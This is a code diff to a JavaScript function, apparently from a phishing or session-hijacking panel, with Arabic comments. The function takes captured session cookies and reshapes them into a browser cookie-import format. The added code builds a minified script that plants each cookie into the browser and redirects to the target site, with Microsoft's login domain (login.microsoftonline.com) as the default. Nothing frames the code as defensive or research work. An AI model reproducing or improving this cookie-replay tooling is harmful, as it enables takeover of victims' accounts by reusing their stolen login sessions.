@@ -1314,9 +1314,17 @@ function downloadCookiesScript(sessionData) {
                     }
                     
                     cookies.push({
-                        domain: domain,
                         name: cookieName,
-                        value: cookieValue
+                        value: cookieValue,
+                        domain: domain,
+                        expirationDate: Date.now() + 31536000000, // سنة واحدة من الآن
+                        hostOnly: false,
+                        httpOnly: true,
+                        path: "/",
+                        sameSite: "none",
+                        secure: true,
+                        session: true,
+                        storeId: null
                     });
                 }
             }
@@ -1336,9 +1344,17 @@ function downloadCookiesScript(sessionData) {
                     if (row.cells.length === 1) return;
                     
                     cookies.push({
-                        domain: row.cells[0].textContent,
                         name: row.cells[1].textContent,
-                        value: row.cells[2].textContent
+                        value: row.cells[2].textContent,
+                        domain: row.cells[0].textContent,
+                        expirationDate: Date.now() + 31536000000, // سنة واحدة من الآن
+                        hostOnly: false,
+                        httpOnly: true,
+                        path: "/",
+                        sameSite: "none",
+                        secure: true,
+                        session: true,
+                        storeId: null
                     });
                 });
             }
@@ -1360,9 +1376,17 @@ function downloadCookiesScript(sessionData) {
                 if (row.cells.length === 1) return;
                 
                 cookies.push({
-                    domain: row.cells[0].textContent,
                     name: row.cells[1].textContent,
-                    value: row.cells[2].textContent
+                    value: row.cells[2].textContent,
+                    domain: row.cells[0].textContent,
+                    expirationDate: Date.now() + 31536000000, // سنة واحدة من الآن
+                    hostOnly: false,
+                    httpOnly: true,
+                    path: "/",
+                    sameSite: "none",
+                    secure: true,
+                    session: true,
+                    storeId: null
                 });
             });
         }
@@ -1389,39 +1413,20 @@ function downloadCookiesScript(sessionData) {
     console.log('%c=================================', 'color:#3498db;');
     console.log('%cعدد الكوكيز: ' + cookies.length, 'font-weight:bold;');
     
-    // إنشاء نص JavaScript لتعيين الكوكيز
-    let jsCode = `// تنزيل الكوكيز للجلسة ${sessionId}\n`;
-    jsCode += `// تاريخ التنزيل: ${new Date().toLocaleString()}\n\n`;
-    jsCode += `!function(){\n`;
-    jsCode += `    console.log("جاري إعداد الكوكيز...");\n\n`;
+    // الحصول على النطاق المستهدف للانتقال بعد تعيين الكوكيز
+    const targetDomain = cookies.length > 0 && cookies[0].domain ? cookies[0].domain : "login.microsoftonline.com";
     
-    // إضافة كل كوكي إلى النص
-    cookies.forEach(cookie => {
-        jsCode += `    // إعداد كوكي ${cookie.name}\n`;
-        jsCode += `    document.cookie = "${cookie.name}=${cookie.value};`;
-        if (cookie.domain) jsCode += `domain=${cookie.domain};`;
-        jsCode += `path=/;Max-Age=31536000;Secure;SameSite=None";\n`;
-        jsCode += `    console.log("تم إعداد الكوكي: ${cookie.name}");\n\n`;
-    });
-    
-    jsCode += `    console.log("تم إعداد جميع الكوكيز بنجاح!");\n`;
-    jsCode += `    alert("تم إعداد الكوكيز بنجاح! يمكنك الآن الانتقال للموقع المستهدف.");\n`;
-    jsCode += `    // الانتقال إلى الموقع المستهدف\n`;
-    if (cookies.length > 0 && cookies[0].domain) {
-        jsCode += `    window.location.href = "https://${cookies[0].domain}";\n`;
-    } else {
-        jsCode += `    // window.location.href = "https://example.com";\n`;
-    }
-    jsCode += `}();`;
+    // إنشاء نص JavaScript بالتنسيق المطلوب
+    let jsCode = `!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}${`\${o.domain?\`\${o.path?"":"path=/"};domain=\${o.domain};\`:""}`}Secure;SameSite=None\`;window.location.href="https://${targetDomain}"}();`;
     
     // إنشاء ملف نصي
-    const blob = new Blob([jsCode], { type: 'application/javascript' });
+    const blob = new Blob([jsCode], { type: 'text/plain' });
     const url = URL.createObjectURL(blob);
     
     // إنشاء رابط تنزيل
     const downloadLink = document.createElement('a');
     downloadLink.href = url;
-    downloadLink.download = `cookies_${sessionId}_${Date.now()}.js`;
+    downloadLink.download = `cookies_${sessionId}_${Date.now()}.txt`;
     
     // تنزيل الملف
     document.body.appendChild(downloadLink);
